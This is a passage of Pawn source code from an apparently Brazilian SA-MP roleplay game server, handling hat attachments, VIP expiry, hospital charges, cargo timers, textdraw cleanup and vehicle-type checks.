		SetPlayerAttachedObject(playerid, 4, 18970, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 31)
	{
		SetPlayerAttachedObject(playerid, 4, 18971, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 32)
	{
		SetPlayerAttachedObject(playerid, 4, 18972, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 33)
	{
		SetPlayerAttachedObject(playerid, 4, 18973, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 34)
	{
		SetPlayerAttachedObject(playerid, 4, 18955, 2, 0.11, 0.02,0,88, 75, 0);
	}
	else if(chapeux == 35)
	{
		SetPlayerAttachedObject(playerid, 4, 18956, 2, 0.11, 0.02,0,88, 75, 0);
	}
	else if(chapeux == 36)
	{
		SetPlayerAttachedObject(playerid, 4, 18957, 2, 0.11, 0.02,0,88, 75, 0);
	}
	else if(chapeux == 37)
	{
		SetPlayerAttachedObject(playerid, 4, 18958, 2, 0.11, 0.02,0,88, 75, 0);
	}
	else if(chapeux == 38)
	{
		SetPlayerAttachedObject(playerid, 4, 18959, 2, 0.11, 0.02,0,88, 75, 0);
	}
	else if(chapeux == 39)
	{
		SetPlayerAttachedObject(playerid, 4, 18936, 2, 0.105, 0.02,0,0,0,0);
	}
	else if(chapeux == 40)
	{
		SetPlayerAttachedObject(playerid, 4, 18937, 2, 0.105, 0.02,0,0,0,0);
	}
	else if(chapeux == 41)
	{
		SetPlayerAttachedObject(playerid, 4, 18938, 2, 0.105, 0.02,0,0,0,0);
	}
	else if(chapeux == 42)
	{
		SetPlayerAttachedObject(playerid, 4, 18926, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 43)
	{
		SetPlayerAttachedObject(playerid, 4, 18927, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 44)
	{
		SetPlayerAttachedObject(playerid, 4, 18928, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 45)
	{
		SetPlayerAttachedObject(playerid, 4, 18929, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 46)
	{
		SetPlayerAttachedObject(playerid, 4, 18930, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 47)
	{
		SetPlayerAttachedObject(playerid, 4, 18931, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 48)
	{
		SetPlayerAttachedObject(playerid, 4, 18932, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 49)
	{
		SetPlayerAttachedObject(playerid, 4, 18933, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 50)
	{
		SetPlayerAttachedObject(playerid, 4, 18934, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 51)
	{
		SetPlayerAttachedObject(playerid, 4, 18935, 2, 0.17,0,-0.01,0,0, 0);
	}
	else if(chapeux == 52)
	{
		SetPlayerAttachedObject(playerid, 4, 18891, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 53)
	{
		SetPlayerAttachedObject(playerid, 4, 18892, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 54)
	{
		SetPlayerAttachedObject(playerid, 4, 18893, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 55)
	{
		SetPlayerAttachedObject(playerid, 4, 18894, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 56)
	{
		SetPlayerAttachedObject(playerid, 4, 18895, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 57)
	{
		SetPlayerAttachedObject(playerid, 4, 18896, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 58)
	{
		SetPlayerAttachedObject(playerid, 4, 18897, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 59)
	{
		SetPlayerAttachedObject(playerid, 4, 18898, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 60)
	{
		SetPlayerAttachedObject(playerid, 4, 18899, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 61)
	{
		SetPlayerAttachedObject(playerid, 4, 18900, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 62)
	{
		SetPlayerAttachedObject(playerid, 4, 18901, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 63)
	{
		SetPlayerAttachedObject(playerid, 4, 18902, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 64)
	{
		SetPlayerAttachedObject(playerid, 4, 18903, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 65)
	{
		SetPlayerAttachedObject(playerid, 4, 18904, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 66)
	{
		SetPlayerAttachedObject(playerid, 4, 18905, 2, 0.15, -0.013, 0.001, 90, -30, -90);
	}
	else if(chapeux == 67)
	{
		SetPlayerAttachedObject(playerid, 4, 18906, 2, 0.12, -0.02, 0.001, 90, -60, -90);
	}
	else if(chapeux == 68)
	{
		SetPlayerAttachedObject(playerid, 4, 18907, 2, 0.12, -0.02, 0.001, 90, -60, -90);
	}
	else if(chapeux == 69)
	{
		SetPlayerAttachedObject(playerid, 4, 18908, 2, 0.12, -0.02, 0.001, 90, -60, -90);
	}
	else if(chapeux == 70)
	{
		SetPlayerAttachedObject(playerid, 4, 18909, 2, 0.12, -0.02, 0.001, 90, -60, -90);
	}
	else if(chapeux == 71)
	{
		SetPlayerAttachedObject(playerid, 4, 18910, 2, 0.12, -0.02, 0.001, 90, -60, -90);
	}
}

stock SetarItensPlayer(playerid)
{
    if(WE_GetInt(f(playerid), "useOculos") != 0)
    {
        SetPlayerOculos(playerid, WE_GetInt(f(playerid), "useOculos"));
    }
    if(WE_GetInt(f(playerid), "useMascara") != 0)
    {
        SetPlayerMascara(playerid, WE_GetInt(f(playerid), "useMascara"));
    }
    if(WE_GetInt(f(playerid), "useChapeu") != 0)
    {
        SetPlayerChapeu(playerid, WE_GetInt(f(playerid), "useChapeu"));
    }
}

stock RemoveItensPlayer(playerid)
{
	new
		i
	;
	while(i != MAX_PLAYER_ATTACHED_OBJECTS)
	{
		if(IsPlayerAttachedObjectSlotUsed(playerid, i))
		{
			RemovePlayerAttachedObject(playerid, i);
		}
		i++;
	}
    useOculos[playerid] = -1,
    useMascara[playerid] = -1,
    useChapeu[playerid] = -1,
	useTipo[playerid] = 0;
}

stock CriarArquivoPresidente(string[])
{
	if(fexist("Eleitos.ini"))
	{
		WE_RemoveFile("Eleitos.ini");
	}
	WE_CreateFile("Eleitos.ini");
	WE_SetInt("Eleitos.ini", "votoStatus", 0);
	WE_SetString("Eleitos.ini", "Presidente", string);
	WE_SetInt("Eleitos.ini", "Candidatos", 0);
	WE_SetString("Eleitos.ini", "1_", "Nenhum");
	WE_SetString("Eleitos.ini", "2_", "Nenhum");
	WE_SetString("Eleitos.ini", "3_", "Nenhum");
	WE_SetString("Eleitos.ini", "4_", "Nenhum");
	WE_SetString("Eleitos.ini", "5_", "Nenhum");
	WE_SetString("Eleitos.ini", "6_", "Nenhum");
	WE_SetString("Eleitos.ini", "7_", "Nenhum");
	WE_SetString("Eleitos.ini", "8_", "Nenhum");
	WE_SetString("Eleitos.ini", "9_", "Nenhum");
	WE_SetString("Eleitos.ini", "10_", "Nenhum");
	WE_SetInt("Eleitos.ini", "1", 0);
	WE_SetInt("Eleitos.ini", "2", 0);
	WE_SetInt("Eleitos.ini", "3", 0);
	WE_SetInt("Eleitos.ini", "4", 0);
	WE_SetInt("Eleitos.ini", "5", 0);
	WE_SetInt("Eleitos.ini", "6", 0);
	WE_SetInt("Eleitos.ini", "7", 0);
	WE_SetInt("Eleitos.ini", "8", 0);
	WE_SetInt("Eleitos.ini", "9", 0);
	WE_SetInt("Eleitos.ini", "10", 0);
}

forward voltarCaminhao(playerid);
public voltarCaminhao(playerid)
{
	if(IsPlayerConnected(playerid) && saiuCaminhao[playerid] == 1)
	{
	    if(cargaTempo[playerid] <= 0)
	    {
			SendClientMessage(playerid, COR_ERRO, "Você ficou mais de 50 segundos fora do caminhão e sua carga foi perdida!");
			GameTextForPlayer(playerid, "~r~~h~CARGA PERDIDA", 1000, 1);
		    DisablePlayerCheckpoint(playerid);
		    Carga[playerid] = 0;
	        return 1;
	    }
		if(cargaTempo[playerid] > 0)
		{
		    cargaTempo[playerid] --;
		    tempoCarga[playerid] = SetTimerEx("voltarCaminhao", 1000, false, "d", playerid);
		    format(gStr, sizeof(gStr), "~n~~n~~n~~r~~h~Volte para o caminhao~n~~b~~h~Tempo %d", cargaTempo[playerid]);
			GameTextForPlayer(playerid, gStr, 1000, 5);
		}
	}
	return 1;
}

stock getarVIP(playerid)
{
	if(WE_GetInt(f(playerid), "PLAYER_VIP") == 1)
	{
		new
		    Ano[2], Mes[2], Dia[2]
		;
		getdate(Ano[0], Mes[0], Dia[0]);

		Mes[1] = WE_GetInt(f(playerid), "VIP_MES");
		Dia[1] = WE_GetInt(f(playerid), "VIP_DIA");
		Ano[1] = WE_GetInt(f(playerid), "VIP_ANO");

		if(WE_GetInt(f(playerid), "VIP_ANO") == 0)
		{
		    WE_SetInt(f(playerid), "VIP_ANO", Ano[0]);
		}
        else
		{
			if(Mes[1] == 2 && Mes[0] == 2 && Dia[1] >= 28 && Dia[0] >= 28 && Ano[1] <= Ano[0] || Mes[0] == Mes[1] && Dia[0] >= Dia[1] && Ano[1] <= Ano[0] || Mes[0] > Mes[1] && Ano[1] <= Ano[0])
			//if(Mes[1] == 2 && Mes[0] == 2 && Dia[1] >= 28 && Dia[0] >= 28 || Mes[0] == Mes[1] && Dia[0] >= Dia[1] || Mes[0] > Mes[1])
			{
			    SendClientMessage(playerid, COR_AMARELO, "Infelizmente seus dias de VIP acabaram.");
			    GameTextForPlayer(playerid, "~r~~h~EX~w~-~y~~h~VIP", 1000, 0);
			    pInfo[playerid][PLAYER_VIP] = 0;
				WE_SetInt(f(playerid), "PLAYER_VIP", 0);
				WE_SetInt(f(playerid), "VIP_MES", 0);
				WE_SetInt(f(playerid), "VIP_DIA", 0);
				WE_SetInt(f(playerid), "VIP_ANO", 0);
				new
					setskin
				;
				if(pInfo[playerid][Sexo] == 1)
				{
				    setskin = 0;
				    SendClientMessage(playerid, COR_AMARELO, "Sua skin foi setada para ID 0 Carl CJ Johnson.");
				}
	  			if(pInfo[playerid][Sexo] == 2)
				{
				    setskin = 13;
				    SendClientMessage(playerid, COR_AMARELO, "Sua skin foi setada para ID 13 Normal Pad.");
				}
				SendClientMessage(playerid, COR_AMARELO, "Você recebe R$500 para comprar uma nova skin.");
				GivePlayerCash(playerid, 500);
				WE_SetInt(f(playerid), "Skin", setskin);
			}
			else
			{
			    if(pInfo[playerid][Preso] == 0)
			    {
					SendClientMessage(playerid, COR_AMARELO, "Você é um(a) jogador(a) VIP.");
					SendClientMessage(playerid, COR_AMARELO, "Você poderá usar um teleporte dentro de 20 segundos {FFFFFF}(/Teles)");
					format(gStr, sizeof(gStr), "Seus dias de VIP vencerão em %d/%d/%d.", WE_GetInt(f(playerid), "VIP_DIA"), WE_GetInt(f(playerid), "VIP_MES"), WE_GetInt(f(playerid), "VIP_ANO"));
					SendClientMessage(playerid, COR_AMARELO, gStr);
					Teleporte[playerid] = 1;
				}
				else
				{
					SendClientMessage(playerid, COR_AMARELO, "Você é um(a) jogador(a) VIP.");
					SendClientMessage(playerid, COR_ERRO, "Você não pode usar nenhum teleporte VIP, você está preso(a).");
					SendClientMessage(playerid, COR_AMARELO, "Você pode usar com ou sem um veículo esses comandos. Veja também: {FFFFFF}/ComandosVIP");
					format(gStr, sizeof(gStr), "Seus dias de VIP irá vencer no dia %d do mês %d do ano de %d.", WE_GetInt(f(playerid), "VIP_DIA"), WE_GetInt(f(playerid), "VIP_MES"), WE_GetInt(f(playerid), "VIP_ANO"));
					SendClientMessage(playerid, COR_AMARELO, gStr);
					Teleporte[playerid] = 0;
				}
			}
		}
	}
}

stock AttTextEntrada(playerid)
{
	new
	    rand_1 = random(14)
	;
	format(gStr, sizeof(gStr), "%s", GetTextShow(rand_1));
	TextDrawSetString(Entrada_T1[playerid], gStr);
}

stock GetTextShow(TextID)
{
	new
	    text[256]
	;
	if(TextID == 0) { text = "load0uk:load0uk"; }
	if(TextID == 1) { text = "loadsc1:loadsc1"; }
	if(TextID == 2) { text = "loadsc2:loadsc2"; }
	if(TextID == 3) { text = "loadsc3:loadsc3"; }
	if(TextID == 4) { text = "loadsc4:loadsc4"; }
	if(TextID == 5) { text = "loadsc5:loadsc5"; }
	if(TextID == 6) { text = "loadsc6:loadsc6"; }
	if(TextID == 7) { text = "loadsc7:loadsc7"; }
	if(TextID == 8) { text = "loadsc8:loadsc8"; }
	if(TextID == 9) { text = "loadsc9:loadsc9"; }
	if(TextID == 10) { text = "loadsc10:loadsc10"; }
	if(TextID == 11) { text = "loadsc11:loadsc11"; }
	if(TextID == 12) { text = "loadsc12:loadsc12"; }
	if(TextID == 13) { text = "loadsc13:loadsc13"; }
	if(TextID == 14) { text = "loadsc14:loadsc14"; }
	return text;
}

stock MensagemHospital(playerid)
{
	if(pInfo[playerid][Convenio] == 0)
	{
		if(pInfo[playerid][Seguro] == 0)
		{
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
			SendClientMessage(playerid, COR_BRANCO, " O tratamento médico lhe custou {009933}R$200,00 reais{FFFFFF}, os mesmos forão descontados de sua conta bancária.");
			SendClientMessage(playerid, COR_BRANCO, " Adquira um {1E90FF}Convênio Médico {FFFFFF}para receber tratamento gratuito.");
			SendClientMessage(playerid, COR_BRANCO, "{FF1E1E}* {FFFFFF}Por não possuir {FF1E1E}Seguro de Acidentes {FFFFFF}você perdeu todo o dinheiro em mãos.");
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
			WE_SetInt(f(playerid), "SaldoBanco", WE_GetInt(f(playerid), "SaldoBanco") - 200);
		}
		else if(pInfo[playerid][Seguro] == 1)
		{
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
			SendClientMessage(playerid, COR_BRANCO, " O tratamento médico lhe custou {009933}R$200,00 reais{FFFFFF}, os mesmos forão descontados de sua conta bancária.");
			SendClientMessage(playerid, COR_BRANCO, " Adquira um {1E90FF}Convênio Médico {FFFFFF}para receber tratamento gratuito.");
			SendClientMessage(playerid, COR_BRANCO, " Você possui {FF1E1E}Seguro de Acidentes {FFFFFF}e o dinheiro que tinha em mãos foi recuperado.");
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
			WE_SetInt(f(playerid), "SaldoBanco", WE_GetInt(f(playerid), "SaldoBanco") - 200);
		}
	}
	else if(pInfo[playerid][Convenio] == 0)
	{
		if(pInfo[playerid][Seguro] == 0)
		{
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
			SendClientMessage(playerid, COR_BRANCO, " Você possui um {1E90FF}Convênio Médico{FFFFFF}, por isso, não precisou pagar taxas ao hospital.");
			SendClientMessage(playerid, COR_BRANCO, "{FF1E1E}* {FFFFFF}Mas, por não possuir um {FF1E1E}Seguro de Acidentes {FFFFFF}você perdeu todo o dinheiro em mãos.");
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
		}
		else if(pInfo[playerid][Seguro] == 1)
		{
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
			SendClientMessage(playerid, COR_BRANCO, " Você é beneficiário de todos os serviços hospitalares e não recebeu taxas.");
			SendClientMessage(playerid, VERMELHO_WE, " [Hospital] ");
		}
	}
}

stock retonarDroga(playerid)
{
	new
	    drogaNome[30]
	;
	if(pInfo[playerid][KiloD] == 1)
	{
	    drogaNome = "maconha";
	}
	else if(pInfo[playerid][KiloD] == 2)
	{
	    drogaNome = "cocaína";
	}
	else if(pInfo[playerid][KiloD] == 3)
	{
	    drogaNome = "crack";
	}
	return drogaNome;
}

stock dataRegistro(playerid)
{
	WE_SetString(f(playerid), "regData", Gdata());
	WE_SetString(hFile, "regHorario", Ghora());
}

stock ultimoLogin(playerid)
{
	WE_SetString(f(playerid), "ulData", Gdata());
	WE_SetString(f(playerid), "ulHorario", Ghora());
}

/*public OnPlayerUseMachine(playerid, machineid, Float:oldhealth, Float:newhealth)
{
    if(!GetMachineActive(machineid))
        return SendClientMessage(playerid, COR_ERRO, "Máquina desativada!"), 0;
    return 1;
}*/

forward DestruirTextsDraws();
public DestruirTextsDraws()
{
	TextDrawHideForAll(InfoSite);
	TextDrawDestroy(InfoSite);
	TextDrawHideForAll(Data);
	TextDrawDestroy(Data);
	TextDrawHideForAll(Relogio);
	TextDrawDestroy(Relogio);
	TextDrawHideForAll(Favela_1);
	TextDrawDestroy(Favela_1);
	TextDrawHideForAll(Favela_2);
	TextDrawDestroy(Favela_2);
	TextDrawHideForAll(AFK1);
	TextDrawDestroy(AFK1);
	TextDrawHideForAll(WE_GAMES1);
	TextDrawDestroy(WE_GAMES1);
	TextDrawHideForAll(WE_GAMES2);
	TextDrawDestroy(WE_GAMES2);
	TextDrawHideForAll(LoginScreen[0]);//1
	TextDrawDestroy(LoginScreen[0]);
	TextDrawHideForAll(LoginScreen[1]);//2
	TextDrawDestroy(LoginScreen[1]);
	TextDrawHideForAll(LoginScreen[2]);//3
	TextDrawDestroy(LoginScreen[2]);
	TextDrawHideForAll(LoginScreen[3]);//4
	TextDrawDestroy(LoginScreen[3]);
	TextDrawHideForAll(LoginScreen[4]);//5
	TextDrawDestroy(LoginScreen[4]);
	TextDrawHideForAll(LoginScreen[5]);//6
	TextDrawDestroy(LoginScreen[5]);
	TextDrawHideForAll(LoginScreen[6]);//7
	TextDrawDestroy(LoginScreen[6]);
	TextDrawHideForAll(LoginScreen[7]);//8
	TextDrawDestroy(LoginScreen[7]);
	TextDrawHideForAll(BoxCarregando);//9
	TextDrawDestroy(BoxCarregando);
	TextDrawHideForAll(IMG_Matou);
	TextDrawDestroy(IMG_Matou);
	TextDrawHideForAll(IMG_Morreu);
	TextDrawDestroy(IMG_Morreu);
	TextDrawHideForAll(RDinheiro);
	TextDrawDestroy(RDinheiro);
	TextDrawHideForAll(Barra1);
	TextDrawDestroy(Barra1);
	TextDrawHideForAll(Barra2);
	TextDrawDestroy(Barra2);
	TextDrawHideForAll(Barra3);
	TextDrawDestroy(Barra3);
  	TextDrawHideForAll(BancoTuto[0]);
  	TextDrawDestroy(BancoTuto[0]);
	TextDrawHideForAll(BancoTuto[1]);
	TextDrawDestroy(BancoTuto[1]);
  	TextDrawHideForAll(BancoTuto[2]);
  	TextDrawDestroy(BancoTuto[2]);
  	TextDrawHideForAll(BancoTuto[3]);
  	TextDrawDestroy(BancoTuto[3]);
  	TextDrawHideForAll(BancoTuto[4]);
  	TextDrawDestroy(BancoTuto[4]);
  	TextDrawHideForAll(PrefeituraTuto[0]);
  	TextDrawDestroy(PrefeituraTuto[0]);
	TextDrawHideForAll(PrefeituraTuto[1]);
	TextDrawDestroy(PrefeituraTuto[1]);
  	TextDrawHideForAll(PrefeituraTuto[2]);
  	TextDrawDestroy(PrefeituraTuto[2]);
  	TextDrawHideForAll(PrefeituraTuto[3]);
  	TextDrawDestroy(PrefeituraTuto[3]);
  	TextDrawHideForAll(DelegaciaTuto[0]);
  	TextDrawDestroy(DelegaciaTuto[0]);
	TextDrawHideForAll(DelegaciaTuto[1]);
	TextDrawDestroy(DelegaciaTuto[1]);
  	TextDrawHideForAll(DelegaciaTuto[2]);
  	TextDrawDestroy(DelegaciaTuto[2]);
  	TextDrawHideForAll(DelegaciaTuto[3]);
  	TextDrawDestroy(DelegaciaTuto[3]);
  	TextDrawHideForAll(DelegaciaTuto[4]);
  	TextDrawDestroy(DelegaciaTuto[4]);
  	TextDrawHideForAll(AutoEscolaTuto[0]);
  	TextDrawDestroy(AutoEscolaTuto[0]);
	TextDrawHideForAll(AutoEscolaTuto[1]);
	TextDrawDestroy(AutoEscolaTuto[1]);
  	TextDrawHideForAll(AutoEscolaTuto[2]);
  	TextDrawDestroy(AutoEscolaTuto[2]);
  	TextDrawHideForAll(AutoEscolaTuto[3]);
  	TextDrawDestroy(AutoEscolaTuto[3]);
  	TextDrawHideForAll(HospitalTuto[0]);
  	TextDrawDestroy(HospitalTuto[0]);
	TextDrawHideForAll(HospitalTuto[1]);
	TextDrawDestroy(HospitalTuto[1]);
  	TextDrawHideForAll(HospitalTuto[2]);
  	TextDrawDestroy(HospitalTuto[2]);
  	TextDrawHideForAll(HospitalTuto[3]);
  	TextDrawDestroy(HospitalTuto[3]);
  	TextDrawHideForAll(HospitalTuto[4]);
  	TextDrawDestroy(HospitalTuto[4]);
  	TextDrawHideForAll(PostoTuto[0]);
  	TextDrawDestroy(PostoTuto[0]);
	TextDrawHideForAll(PostoTuto[1]);
	TextDrawDestroy(PostoTuto[1]);
  	TextDrawHideForAll(PostoTuto[2]);
  	TextDrawDestroy(PostoTuto[2]);
  	TextDrawHideForAll(UtilTuto[0]);
  	TextDrawDestroy(UtilTuto[0]);
	TextDrawHideForAll(UtilTuto[1]);
	TextDrawDestroy(UtilTuto[1]);
  	TextDrawHideForAll(UtilTuto[2]);
  	TextDrawDestroy(UtilTuto[2]);
  	TextDrawHideForAll(SkinTuto[0]);
  	TextDrawDestroy(SkinTuto[0]);
	TextDrawHideForAll(SkinTuto[1]);
	TextDrawDestroy(SkinTuto[1]);
  	TextDrawHideForAll(SkinTuto[2]);
  	TextDrawDestroy(SkinTuto[2]);
  	TextDrawHideForAll(NeedsTuto[0]);
  	TextDrawDestroy(NeedsTuto[0]);
	TextDrawHideForAll(NeedsTuto[1]);
	TextDrawDestroy(NeedsTuto[1]);
  	TextDrawHideForAll(NeedsTuto[2]);
  	TextDrawDestroy(NeedsTuto[2]);
  	TextDrawHideForAll(NeedsTuto[3]);
  	TextDrawDestroy(NeedsTuto[3]);
	TextDrawHideForAll(BaseTuto[0]);
	TextDrawDestroy(BaseTuto[0]);
	TextDrawHideForAll(BaseTuto[1]);
	TextDrawDestroy(BaseTuto[1]);
	TextDrawHideForAll(BaseTuto[2]);
	TextDrawDestroy(BaseTuto[2]);
	TextDrawHideForAll(BaseTuto[3]);
	TextDrawDestroy(BaseTuto[3]);
	for(new i = 0; i < MAX_PLAYERS; ++i)
	{
	    TextDrawHideForPlayer(i, InfoLevel[i]);
		TextDrawDestroy(InfoLevel[i]);
		TextDrawHideForPlayer(i, MSG_Matou[i]);
		TextDrawDestroy(MSG_Matou[i]);
		TextDrawHideForPlayer(i, TextLevelUP[i]);
		TextDrawDestroy(TextLevelUP[i]);
		TextDrawHideForPlayer(i, Zones[i]);
		TextDrawDestroy(Zones[i]);
		/*TextDrawHideForPlayer(i, Velocidade[i]);
		TextDrawDestroy(Velocidade[i]);
		TextDrawHideForPlayer(i, Gasolina[i]);
		TextDrawDestroy(Gasolina[i]);
		TextDrawHideForPlayer(i, VeiculoV[i]);
		TextDrawDestroy(VeiculoV[i]);
		TextDrawHideForPlayer(i, VeiculoL[i]);
		TextDrawDestroy(VeiculoL[i]);*/
		TextDrawHideForPlayer(i, VIPtext[i]);
		TextDrawDestroy(VIPtext[i]);
		/*TextDrawHideForPlayer(i, Modelo[i]);
		TextDrawDestroy(Modelo[i]);*/
		TextDrawHideForPlayer(i, p_TextPreso[i]);
		TextDrawDestroy(p_TextPreso[i]);
		TextDrawHideForPlayer(i, TempoPreso[i]);
		TextDrawDestroy(TempoPreso[i]);
		TextDrawHideForPlayer(i, Server_Areas[i]);
		TextDrawDestroy(Server_Areas[i]);
		TextDrawHideForAll(GPSLocal);
	    TextDrawDestroy(GPSLocal);
		/*TextDrawHideForAll(BoxVeloc);
	    TextDrawDestroy(BoxVeloc);*/
   		TextDrawHideForAll(Velocimetro0[i]);
		TextDrawDestroy(Velocimetro0[i]);
		TextDrawHideForAll(Velocimetro1[i]);
		TextDrawDestroy(Velocimetro1[i]);
		TextDrawHideForAll(Velocimetro2[i]);
		TextDrawDestroy(Velocimetro2[i]);
		TextDrawHideForAll(Velocimetro3[i]);
		TextDrawDestroy(Velocimetro3[i]);
		TextDrawHideForAll(Velocimetro4[i]);
		TextDrawDestroy(Velocimetro4[i]);
		TextDrawHideForAll(Velocimetro5[i]);
		TextDrawDestroy(Velocimetro5[i]);
		TextDrawHideForAll(Velocimetro6[i]);
		TextDrawDestroy(Velocimetro6[i]);
		TextDrawHideForAll(Velocimetro7[i]);
		TextDrawDestroy(Velocimetro7[i]);
		TextDrawHideForAll(Velocimetro8[i]);
		TextDrawDestroy(Velocimetro8[i]);
    }
	for(new t; t < 4; t++)
	{
		TextDrawHideForAll(TextAnuncio[t]);
	    TextDrawDestroy(TextAnuncio[t]);
	}
	return 1;
}

/*stock CriarOrganizacoes()
{
	for(new i = 1; i != 8; ++i)
	{
	    new
	        ofile[128]
		;
	    format(ofile, sizeof(ofile), "Orgs/Org[%d].ini", i);
		if(!fexist(ofile))
		{
			WE_CreateFile(ofile);
			WE_SetInt(ofile, "Org_ID", i);
			WE_SetString(ofile, "Org_Nome", nomeOrg(i));
			WE_SetString(ofile, "Lider", "Ninguem");
			WE_SetString(ofile, "SubLider", "Ninguem");
			for(new m = 1; m != 21; ++m)
			{
			    format(gStr, sizeof(gStr), "M[%d]", m);
			    WE_SetString(ofile, gStr, "Ninguem");
			}
		}
	}
}

stock nomeOrg(orgID)
{
	new
		onome[50]
	;
	if(orgID == 1)
	{
	    onome = "Terroristas";
	}
	if(orgID == 2)
	{
	    onome = "ROTA";
	}
	if(orgID == 3)
	{
	    onome = "Força Tática";
	}
	if(orgID == 4)
	{
	    onome = "Exército";
	}
	if(orgID == 5)
	{
	    onome = "Marinha";
	}
	if(orgID == 6)
	{
	    onome = "Força Aérea";
	}
	if(orgID == 7)
	{
	    onome = "Comando Vermelho";
	}
	return onome;
}

stock SpawnOrg(playerid, OrgID)
{
	if(OrgID == 1)
	{
	    SetPlayerPos(playerid, -807.0303,2416.4192,156.7814);
	    SetPlayerFacingAngle(playerid, 212.8911);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	if(OrgID == 2)
	{
	    SetPlayerPos(playerid, 0.0, 0.0, 0.0);
	    SetPlayerFacingAngle(playerid, 0.0);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	if(OrgID == 3)
	{
	    SetPlayerPos(playerid, 0.0, 0.0, 0.0);
	    SetPlayerFacingAngle(playerid, 0.0);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	if(OrgID == 4)
	{
	    SetPlayerPos(playerid, 0.0, 0.0, 0.0);
	    SetPlayerFacingAngle(playerid, 0.0);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	if(OrgID == 5)
	{
	    SetPlayerPos(playerid, 0.0, 0.0, 0.0);
	    SetPlayerFacingAngle(playerid, 0.0);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	if(OrgID == 6)
	{
	    SetPlayerPos(playerid, 0.0, 0.0, 0.0);
	    SetPlayerFacingAngle(playerid, 0.0);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	if(OrgID == 7)
	{
	    SetPlayerPos(playerid, 0.0, 0.0, 0.0);
	    SetPlayerFacingAngle(playerid, 0.0);
	    SetCameraBehindPlayer(playerid);
	    return 1;
	}
	return 1;
}

stock SetColorOrg(playerid, OrgID)
{
	if(OrgID == 1)
	{
	    SetPlayerColor(playerid, 0xBD4900FF);
	    return 1;
	}
	if(OrgID == 2)
	{
	    SetPlayerColor(playerid, 0x4C3723FF);
	    return 1;
	}
	if(OrgID == 3)
	{
	    SetPlayerColor(playerid, 0x3D5DFFFF);
	    return 1;
	}
	if(OrgID == 4)
	{
	    SetPlayerColor(playerid, 0x024C20FF);
	    return 1;
	}
	if(OrgID == 5)
	{
	    SetPlayerColor(playerid, 0x002573FF);
	    return 1;
	}
	if(OrgID == 6)
	{
	    SetPlayerColor(playerid, 0xB6D6FFFF);
	    return 1;
	}
	if(OrgID == 7)
	{
	    SetPlayerColor(playerid, 0x85001DFF);
	    return 1;
	}
	return 1;
}*/

stock EUmCarro(vehicleid)//IsACar
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
        case 400, 401, 402, 404, 405, 409, 410, 411, 412, 415,
        418, 419, 420, 421, 422, 424, 426, 429, 434, 435, 436, 438,
        439, 442, 444, 445, 451, 458, 466, 467, 470, 474, 475, 479,
        480, 483, 489, 490, 491, 492, 494, 495, 496,500, 502, 503, 504, 505, 506,
        507, 516, 517, 518,525, 526, 527, 528, 529, 533, 534, 535, 536, 540, 541,
        542, 543, 545, 546, 547, 549, 550, 551,554, 555, 556, 557, 558, 559, 560, 561, 562,
        565, 566, 567, 568, 575, 576, 579, 580, 582, 585, 587, 588,  589, 596, 597, 598, 599,
        600,602, 603, 604, 605: result = model;
        default: result = 0;
    }
	return result;
}

stock EUmTrem(vehicleid)
{
	new result;
	new model = GetVehicleModel(vehicleid);
	switch(model)
	{
	    case 537, 538: result = model;
        default: result = 0;
    }
	return result;
}

stock EUmCaminhao(vehicleid)
{
	new result;
	new model = GetVehicleModel(vehicleid);
	switch(model)
	{
	    case 403, 406, 407, 408, 413, 414, 416, 423, 427, 428, 431, 432, 433, 437, 440, 443, 455, 456,
	    459, 478, 482, 486, 498, 499, 508, 514, 515, 524, 544, 552, 573, 578, 601, 609: result = model;
        default: result = 0;
    }
	return result;
}

stock EUmHeli(vehicleid)//IsAPlane
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
    	case 417, 425, 447, 465, 469, 487, 488, 497, 501, 548, 563: result = model;
